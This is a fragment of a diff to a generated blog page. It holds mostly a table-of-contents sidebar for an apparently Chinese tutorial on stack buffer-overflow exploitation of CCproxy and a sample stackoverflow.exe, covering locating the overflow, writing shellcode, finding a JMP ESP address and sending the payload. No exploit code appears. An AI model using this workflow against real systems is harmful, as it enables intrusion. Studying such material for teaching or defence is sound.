toc-level-3"><a class="toc-link" href="#CCproxy漏洞利用"><span class="toc-number">2.2.3.</span> <span class="toc-text">CCproxy漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#定位溢出点分析"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">定位溢出点分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#填充shellcode"><span class="toc-number">2.2.3.2.</span> <span class="toc-text">填充shellcode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stackoverflow-exe漏洞利用"><span class="toc-number">2.2.4.</span> <span class="toc-text">stackoverflow.exe漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#定位溢出点分析-1"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">定位溢出点分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#编写shellcode"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">编写shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#获取JMP-ESP的地址"><span class="toc-number">2.2.4.2.1.</span> <span class="toc-text">获取JMP ESP的地址</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#发送payload"><span class="toc-number">2.2.4.3.</span> <span class="toc-text">发送payload</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1425,6 +1462,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
